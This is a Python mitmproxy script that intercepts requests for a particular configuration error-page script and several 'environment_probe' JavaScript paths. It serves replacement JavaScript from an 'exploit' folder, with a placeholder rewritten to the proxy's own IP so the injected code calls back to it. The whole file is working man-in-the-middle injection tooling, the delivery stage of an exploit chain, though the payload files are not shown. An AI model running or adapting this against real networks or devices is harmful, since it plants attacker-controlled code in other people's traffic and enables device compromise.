from mitmproxy import http
import os

import proxy as base_proxy


tls_clienthello = base_proxy.tls_clienthello


def request(flow: http.HTTPFlow) -> None:
    proxy_server_ip = flow.client_conn.sockname[0].encode("UTF-8")

    if "/js/common/config/text/config.text.lruderrorpage" in flow.request.path:
        inject_path = os.path.join(
            os.path.dirname(__file__),
            "..",
            "exploit",
            "environment_probe_bootstrap.js",
        )
        print(f"[*] Injecting JavaScript from: {inject_path}")

        try:
            with open(inject_path, "rb") as f:
                content = f.read().replace(b"PLS_STOP_HARDCODING_IPS", proxy_server_ip)
                print(f"[+] Loaded {len(content)} bytes from environment_probe_bootstrap.js")
                flow.response = http.Response.make(
                    200,
                    content,
                    {"Content-Type": "application/javascript"},
                )
        except FileNotFoundError:
            print(f"[!] ERROR: environment_probe_bootstrap.js not found at {inject_path}")
            flow.response = http.Response.make(
                404,
                b"File not found: environment_probe_bootstrap.js",
                {"Content-Type": "text/plain"},
            )
        return

    if "/js/environment_probe_bootstrap.js" in flow.request.path:
        inject_path = os.path.join(
            os.path.dirname(__file__),
            "..",
            "exploit",
            "environment_probe_bootstrap.js",
        )
        print(f"[*] Injecting JavaScript from: {inject_path}")

        try:
            with open(inject_path, "rb") as f:
                content = f.read().replace(b"PLS_STOP_HARDCODING_IPS", proxy_server_ip)
                print(f"[+] Loaded {len(content)} bytes from environment_probe_bootstrap.js")
                flow.response = http.Response.make(
                    200,
                    content,
                    {"Content-Type": "application/javascript"},
                )
        except FileNotFoundError:
            print(f"[!] ERROR: environment_probe_bootstrap.js not found at {inject_path}")
            flow.response = http.Response.make(
                404,
                b"File not found: environment_probe_bootstrap.js",
                {"Content-Type": "text/plain"},
            )
        return

    if "/js/environment_probe_loader.js" in flow.request.path:
        inject_path = os.path.join(
            os.path.dirname(__file__),
            "..",
            "exploit",
            "environment_probe_loader.js",
        )
        print(f"[*] Injecting JavaScript from: {inject_path}")

        try:
            with open(inject_path, "rb") as f:
                content = f.read().replace(b"PLS_STOP_HARDCODING_IPS", proxy_server_ip)
                print(f"[+] Loaded {len(content)} bytes from environment_probe_loader.js")
                flow.response = http.Response.make(
                    200,
                    content,
                    {"Content-Type": "application/javascript"},
                )
        except FileNotFoundError:
            print(f"[!] ERROR: environment_probe_loader.js not found at {inject_path}")
            flow.response = http.Response.make(
                404,
                b"File not found: environment_probe_loader.js",
                {"Content-Type": "text/plain"},
            )
        return

    if "/js/environment_probe_checklist.js" in flow.request.path:
        inject_path = os.path.join(
            os.path.dirname(__file__),
            "..",
            "exploit",
            "environment_probe_checklist.js",
        )
        print(f"[*] Injecting JavaScript from: {inject_path}")

        try:
            with open(inject_path, "rb") as f:
                content = f.read().replace(b"PLS_STOP_HARDCODING_IPS", proxy_server_ip)
                print(f"[+] Loaded {len(content)} bytes from environment_probe_checklist.js")
                flow.response = http.Response.make(
                    200,
                    content,
                    {"Content-Type": "application/javascript"},
                )
        except FileNotFoundError:
            print(f"[!] ERROR: environment_probe_checklist.js not found at {inject_path}")
            flow.response = http.Response.make(
                404,
                b"File not found: environment_probe_checklist.js",
                {"Content-Type": "text/plain"},
            )
        return

    base_proxy.request(flow)
